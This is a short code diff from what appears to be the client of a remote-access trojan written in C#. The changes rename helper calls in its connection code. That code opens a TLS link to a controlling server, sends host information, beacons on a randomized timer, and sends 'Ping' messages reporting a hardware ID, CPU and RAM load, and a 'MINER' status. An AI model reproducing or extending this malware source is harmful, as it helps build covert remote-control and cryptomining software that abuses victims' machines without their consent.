@@ -88,7 +88,7 @@ namespace Client.Connection
                     SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
                     Buffer = new byte[4];
                     MS = new MemoryStream();
-                    Send(Methods.SendInfo());
+                    Send(IdSender.SendInfo());
                     Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
                     SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
                 }
@@ -239,7 +239,7 @@ namespace Client.Connection
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "Ping";
-            msgpack.ForcePathObject("Message").AsString = $"MINER {SetRegistry.GetValue(Settings.Hwid) ?? "0"}   CPU {(int)Methods.TheCPUCounter.NextValue()}%   RAM {(int)Methods.TheMemCounter.NextValue()}%";
+            msgpack.ForcePathObject("Message").AsString = $"MINER {SetRegistry.GetValue(Settings.Hwid) ?? "0"}   CPU {(int)IdSender.TheCPUCounter.NextValue()}%   RAM {(int)IdSender.TheMemCounter.NextValue()}%";
             Send(msgpack.Encode2Bytes());
             GC.Collect();
         }
